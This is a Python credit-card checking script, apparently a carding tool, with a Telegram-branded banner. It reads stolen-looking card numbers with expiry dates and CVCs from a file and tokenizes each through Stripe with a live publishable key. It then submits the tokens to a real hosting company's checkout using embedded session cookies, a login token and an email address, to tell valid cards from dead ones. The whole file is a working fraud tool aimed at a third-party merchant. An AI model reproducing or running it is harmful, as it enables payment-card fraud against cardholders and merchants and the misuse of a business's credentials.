try:
 import requests
 import pyfiglet,re
 import json
 import time
 from colorama import Fore
 import colorama
except ModuleNotFoundError:
 os.system('pip install requests')
 os.system('pip install pyfiglet')
 os.system('clear')

print(Fore.BLUE+"""
[  1️⃣  .Telegram - 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁 🇩🇿⃤ . ( Legendary )  ... 
[  2️⃣  .I am a programming developer in several programming languages. ...   
[  3️⃣  .Developer of Python tools and many programming languages. ...
[  4️⃣  .kos om team beson haha  ...
[  5️⃣  .My Chanal Tele 2 - https://t.me/modcathelost  ...
[  6️⃣  .My Bot Telegram - @modcatthelost_bot  ...
[  7️⃣  .𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ .يتمنى لاصحاب فك التشفير ان يصبحو رجالا ✓
""")
file=open('Modca.txt',"+r")
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
k = ("                                    𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁 🇩🇿⃤ . ( Legendary )" )
print(C + k)
print('      ----------------------------\<>/-------------------------')
start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    mm=P.split('|')[1]
    yy=P.split('|')[2][-2:]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')	
    time.sleep(10)
    headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,fr-DZ;q=0.6,fr;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=2b62a2c1-10bc-418f-ac59-9381507181b674acaf&muid=82be8f7f-dda5-47c3-bcf6-7249a82aa4da581755&sid=1e06a692-1b0a-413e-a462-4dd9d7d70650aad106&payment_user_agent=stripe.js%2F0651b07260%3B+stripe-js-v3%2F0651b07260%3B+split-card-element&referrer=https%3A%2F%2Fclients.asurahosting.com&time_on_page=67888&key=pk_live_51K9x9oLI1SL4EGpUbktL84zF7JsJyzmVYeARDaWoHAhSOObtNBeBRtvNBRL8MJQFgrQ7QmYnFiQRDijzNGuiUkaN00xQybd4DF'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
     


    try:
        id = response.json()['id']
    except:
        print('#')

    time.sleep(10)

    cookies = {
	    '_gcl_au': '1.1.1918704848.1694859891',
	    '_ga': 'GA1.1.1970862123.1694859891',
	    '__stripe_mid': '82be8f7f-dda5-47c3-bcf6-7249a82aa4da581755',
	    'WHMCSlogin_auth_tk': 'cWt5ZE1aTnMzR0k1MW5sMDVodVZHTUdyM1U4Z2pHUVZBR284cFUzOENWRWhzeXFyRnYzMWVpcVoxVVRZZUl5STUweG10ekswWDM2ZlJTMmNHWU10UFNyWVJvNGllV1VWdS9WclJLODByQXdTMCs0OVJlZUwvTUF2SExQUFNZb0s5UE1ISldBMkwxZnVmcmliT0RyU1lQSnloZlRUdUkwdVp0TFU2Vk5OWGVQWXcxUzVRYnBheG4rcTNRekxGR0V6RjY0dm5NT1o5amJRYXFTRk5TcEYrcVRnQW44alREVkVzK1pubTRzS1BxUkFiazNTc3lNd3Fla29hVUNvR3o3Z3duaGNsa2p1djQyMWJZT2d0MWt3dTZtUlBMdE1WdGtBOFpqa2RXdWRJclJMQUJueFljU3d3c1FhT3ZNWjE4dnhCWkRDTVdPb1dweEh5cHZPZ2RBcDFNMHpCbHJzY0lCMkM5QU1UalpJazJVVUlzRUZ3dFVRL3Mxak5oY29TM2ZscHpnYmdoSE45TThraVN0V2x4cHpDRnhDYWR4UmQ1dGQ%3D',
	    'WHMCSakgme2xxDWj4': '54bfe8aa098601cf5ab4d86affe5fa91',
	    '__stripe_sid': '1e06a692-1b0a-413e-a462-4dd9d7d70650aad106',
	    '_ga_92WVCLVGV9': 'GS1.1.1702553767.25.1.1702553827.0.0.0',
    }

    headers = {
	    'authority': 'clients.asurahosting.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,fr-DZ;q=0.6,fr;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_gcl_au=1.1.1918704848.1694859891; _ga=GA1.1.1970862123.1694859891; __stripe_mid=82be8f7f-dda5-47c3-bcf6-7249a82aa4da581755; WHMCSlogin_auth_tk=cWt5ZE1aTnMzR0k1MW5sMDVodVZHTUdyM1U4Z2pHUVZBR284cFUzOENWRWhzeXFyRnYzMWVpcVoxVVRZZUl5STUweG10ekswWDM2ZlJTMmNHWU10UFNyWVJvNGllV1VWdS9WclJLODByQXdTMCs0OVJlZUwvTUF2SExQUFNZb0s5UE1ISldBMkwxZnVmcmliT0RyU1lQSnloZlRUdUkwdVp0TFU2Vk5OWGVQWXcxUzVRYnBheG4rcTNRekxGR0V6RjY0dm5NT1o5amJRYXFTRk5TcEYrcVRnQW44alREVkVzK1pubTRzS1BxUkFiazNTc3lNd3Fla29hVUNvR3o3Z3duaGNsa2p1djQyMWJZT2d0MWt3dTZtUlBMdE1WdGtBOFpqa2RXdWRJclJMQUJueFljU3d3c1FhT3ZNWjE4dnhCWkRDTVdPb1dweEh5cHZPZ2RBcDFNMHpCbHJzY0lCMkM5QU1UalpJazJVVUlzRUZ3dFVRL3Mxak5oY29TM2ZscHpnYmdoSE45TThraVN0V2x4cHpDRnhDYWR4UmQ1dGQ%3D; WHMCSakgme2xxDWj4=54bfe8aa098601cf5ab4d86affe5fa91; __stripe_sid=1e06a692-1b0a-413e-a462-4dd9d7d70650aad106; _ga_92WVCLVGV9=GS1.1.1702553767.25.1.1702553827.0.0.0',
	    'origin': 'https://clients.asurahosting.com',
	    'referer': 'https://clients.asurahosting.com/cart.php?a=checkout',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
    }
    data = {
	    'token': '3cc36982d6d427fcb3bb1cbe5a8f9a2e939a5623',
	    'submit': 'true',
	    'custtype': 'existing',
	    'account_id': '28320',
	    'firstname': 'Ibkkjvjc',
	    'lastname': 'Jvjgucy',
	    'email': 'fcodzilla@gmail.com',
	    'country-calling-code-phonenumber': '1',
	    'phonenumber': '',
	    'companyname': '',
	    'address1': 'put',
	    'address2': 'january',
	    'city': 'key',
	    'state': '',
	    'postcode': '10080',
	    'country': 'US',
	    'contact': '',
	    'domaincontactfirstname': '',
	    'domaincontactlastname': '',
	    'domaincontactemail': '',
	    'country-calling-code-domaincontactphonenumber': '1',
	    'domaincontactphonenumber': '',
	    'domaincontactcompanyname': '',
	    'domaincontacttax_id': '',
	    'domaincontactaddress1': '',
	    'domaincontactaddress2': '',
	    'domaincontactcity': '',
	    'domaincontactstate': '',
	    'domaincontactpostcode': '',
	    'domaincontactcountry': 'US',
	    'applycredit': '1',
	    'paymentmethod': 'stripe',
	    'ccinfo': 'new',
	    'ccdescription': '',
	    'notes': '',
	    'payment_method_id': id,
	}

    response = requests.post(
		'https://clients.asurahosting.com/index.php?rp=/stripe/payment/intent',
		cookies=cookies,
		headers=headers,
		data=data,
	)

    modca = response.json()

    if "validation_feedback" in modca:
        validation_feedback = modca["validation_feedback"]
        print(f"[{start_num}] {P} ➤ " + validation_feedback)
    else:
        print("DIE")